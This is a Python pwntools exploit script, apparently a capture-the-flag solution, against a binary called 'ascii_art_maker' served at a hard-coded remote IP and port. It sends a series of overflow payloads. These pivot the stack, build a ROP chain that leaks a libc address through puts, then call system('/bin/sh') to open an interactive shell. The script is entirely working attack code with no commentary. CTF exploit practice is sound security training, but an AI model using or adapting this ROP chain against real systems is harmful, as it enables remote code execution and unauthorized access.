#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./ascii_art_maker')
	bin = ELF('./ascii_art_maker')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('111.230.149.72',10012)
	bin = ELF('./ascii_art_maker')
	libc = ELF('./libc64.so')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

prdi = 0x400a93
leave=0x400a2b
cn.recv()

pay = ''
pay = pay.ljust(0x80,'\x00')
pay+=p64(0x602f00)
pay+= p64(0x4009FC)
#z('b*0x0000000000400A2B\nc')
cn.send(pay)


pay = ''
pay+= p64(prdi)+p64(bin.got['read'])
pay+= p64(bin.plt['puts'])+p64(0x4009E0)
pay = pay.ljust(0x80,'\x00')
pay+=p64(0x602d00)
pay+= p64(0x4009FC)
cn.send(pay)


pay = ''
pay = pay.ljust(0x80,'\x00')
pay+=p64(0x602f00-0x80-8)
pay+= p64(leave)
cn.send(pay)

while 1:
	d = cn.recv()
	if 'Welcome' in d:
		break
libc_base = u64(d.replace('\n','')[:6]+'\x00\x00')-libc.symbols['read']
success(hex(libc_base))
system = libc_base+libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh\x00').next()

pay = ''
pay = pay.ljust(0x80,'\x00')
pay+=p64(0x602ff0)
pay+= p64(0x4009FC)
#z('b*0x0000000000400A2B\nc')
cn.send(pay)


pay = ''
pay+= p64(prdi)+p64(binsh)
pay+= p64(system)+p64(0x4009E0)
pay = pay.ljust(0x80,'\x00')
pay+=p64(0x602d00)
pay+= p64(0x4009FC)
cn.send(pay)


pay = ''
pay = pay.ljust(0x80,'\x00')
pay+=p64(0x602ff0-0x80-8)
pay+= p64(leave)
cn.send(pay)



cn.interactive()
